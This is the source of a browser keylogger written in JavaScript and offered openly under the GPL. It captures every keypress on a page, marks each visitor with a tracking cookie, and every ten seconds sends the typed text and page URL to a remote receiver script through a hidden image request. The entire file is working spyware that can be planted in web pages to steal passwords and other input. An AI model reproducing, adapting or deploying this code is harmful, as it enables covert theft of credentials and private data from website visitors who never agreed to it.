/*
 * Dear all, this is a Keylogger designed by Victor Kabdebon in 2011
 * To get the last version and more visit : http://www.voxnucleus.fr and/or http://www.victorkabdebon.com
 * 
 * Bonjour a tous, voici un keylogger, fait par Victor Kabdebon en 2011
 * Pour avoir la derniere version et bien plus, visitez : http://www.voxnucleus.fr and/or http://www.victorkabdebon.com
 * 
 * License : GPL v2
 * Version : 0.1
 */


/*
 * Keylogger object
 */
function Keylogger(){
	//Bufers 
		
	
	/*
	 * Configuration of the keylogger
	 ******
	 * track_keys : True if one wants to track the key pressed
	 * track_mouse : True if one wants to track the movements of mouse
	 * track_clicks : true if one wants to track the click
	 * send_interval_s : interval to send the request to the server (in second)
	 * distant_server : address of the server
	 * cookie_name : Name of the cookie in the browser
	 * cookie_lifetime : Lifetime of the cookie in days
	 */
	this.keylog_configuration={
			track_keys: true,
			track_mouse: true,
			track_clicks:true,
			send_interval_s:10,
			distant_server:&#39;http://www.victorkabdebon.com/projects/keylogger/receiver.php5&#39;,
			cookie_name:&#39;keylog-cook&#39;,
			cookie_lifetime:1
	};
	/*
	 * Function that generates a GUID (but not a strong one)
	 */
	this.S4=function() {
		 return (((1+Math.random())*0x10000)|0).toString(16).substring(1);
	};

	/*
	 * Constructor-like function
	 * Initialize elements to the right values 
	 */
	this.begin=function(){
		
		var guid_in_cookies;
		var i,x,y,ARRcookies=document.cookie.split(&#34;;&#34;);
		for (i=0;i&lt;ARRcookies.length;i++)
		  {
		  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf(&#34;=&#34;));
		  y=ARRcookies[i].substr(ARRcookies[i].indexOf(&#34;=&#34;)+1);
		  x=x.replace(/^\s+|\s+$/g,&#34;&#34;);
		  if (x==this.keylog_configuration.cookie_name)
		    {
			  guid_in_cookies= unescape(y);
		    }
		  }
		
		if(guid_in_cookies!=null &amp;&amp; guid_in_cookies.length &gt;0){
			this.guid=guid_in_cookies;
		}
		else{
			/* Create the GUID */
			this.guid= (this.S4()+this.S4()+&#34;-&#34;+this.S4()+&#34;-&#34;+
					this.S4()+&#34;-&#34;+this.S4()+&#34;-&#34;+this.S4()+
					this.S4()+this.S4());
			
			/* Cookie setup*/
			var exdate = new Date();
			var exdays = this.keylog_configuration.cookie_lifetime;
			exdate.setDate(exdate.getDate() +exdays );
			
			var c_value=escape(this.guid) + ((exdays==null) ? &#34;&#34; : &#34;; expires=&#34;+exdate.toUTCString());
			document.cookie=this.keylog_configuration.cookie_name + &#34;=&#34; + c_value;
		}
		this.from_page=encodeURIComponent(window.location.href);
		this.transfer_buffer();
		//alert(&#34;Method had been called&#34; + this.property1);
	};
	/*
	 * Insert a key
	 */
	this.insert_key=function(event){
		var new_char=&#39;&#39;;
		if(event.altKey){
			new_char = &#39;{{Alt}}&#39;;
		}else if(event.ctrlKey){
			new_char = &#39;{{Ctrl}}&#39;;
		}else if(event.shiftKey){
			new_char = &#39;{{Shift}}&#39;;
		}
		if(event.keyCode!=null){
			if(event.keyCode){
				new_char=new_char+this.decodeChar(event.keyCode);
			}else{
				new_char=new_char+this.decodeChar(event.charCode);
			}
		}
		
		this.buffer_text_current=this.buffer_text_current+new_char;
	};

	/*
	 * Decode special characters.
	 */
	this.decodeChar=function(code){
		var charac;
		switch(code){
		case 8:
			charac=&#39;{{Backspace}}&#39;;
			break;
		case 9:
			charac=&#39;{{Tab}}&#39;;
			break;
		case 13:
			charac=&#39;{{Enter}}&#39;;
			break;
		case 33:
			break;
		case 37:
			charac=&#39;{{&lt;-}}&#39;;
			break;
		case 38:
			charac=&#39;{{up}}&#39;;
			break;
		case 39:
			charac=&#39;{{-&gt;}}&#39;;
			break;
		case 40:
			charac=&#39;{{down}}&#39;;
			break;
		case 46:
			charac=&#39;{{delete}}&#39;;
			break;
		case 91:
			charac=&#39;{{leftWindow}}&#39;;
			break;
		case 92:
			charac=&#39;{{rightWindow}}&#39;;
			break;
		case 154:
			charac=&#39;{{PrtScreen}}&#39;;
			break;
		default:
			charac=String.fromCharCode(code);
			break;
		}
		return charac;
	};
	/*
	 * 
	 */
	this.insert_click=function(event){
		// Nothing at the moment
	};
	/*
	 * 
	 */
	this.send_infos=function(){
		var parameters=&#39;?frompage=&#39;+this.from_page;
		parameters =parameters + &#39;&amp;guid=&#39;+this.guid;
		parameters = parameters + &#39;&amp;text=&#39;+encodeURIComponent(this.buffer_text_to_send);
		var address_to_call=this.keylog_configuration.distant_server+parameters;
		//We just preload the image without actually inserting it
		image01= new Image();
		image01.src=address_to_call;
	};
	/*
	 * Swap values
	 */
	this.transfer_buffer=function(){
		this.buffer_text_to_send=this.buffer_text_current;
		this.buffer_text_current=&#39;&#39;;
		this.send_infos();
		
		var t = setTimeout(&#39;logger.transfer_buffer()&#39;,this.keylog_configuration.send_interval_s*1000);
	};
	

	this.buffer_text_current=&#39;[Begin session]&#39;,
	this.buffer_text_to_send=&#39;&#39;,
	//Important information
	this.guid=&#39;UNDEFINED&#39;,
	this.from_page=&#39;UNDEFINED&#39;;
	
	
}
var logger = new Keylogger();
/*
 * Launch the logger
 */
function launch(){
	logger.begin();
	//binding for key pressed
	if(logger.keylog_configuration.track_keys){
		  if (navigator.appName == &#39;Microsoft Internet Explorer&#39;)
		  {
			  document.body.attachEvent(&#39;onkeypress&#39;,process_key);
		  }else{
			  //Binding for everything but ie
			 document.addEventListener(&#39;keypress&#39;,process_key,false);
			  
			  //document.body.setAttribute(&#39;onKeyPress&#39;,&#39;Keylogger.insert_key(event)&#39;);
		  }	
	}
	//Binding for click
	if(logger.keylog_configuration.track_clicks){
		//Binding for everything but ie
		//document.body.setAttribute(&#39;onclick&#39;,&#39;Keylogger.insert_click(event)&#39;);
	}
}

function process_key(event){
	logger.insert_key(event);
}

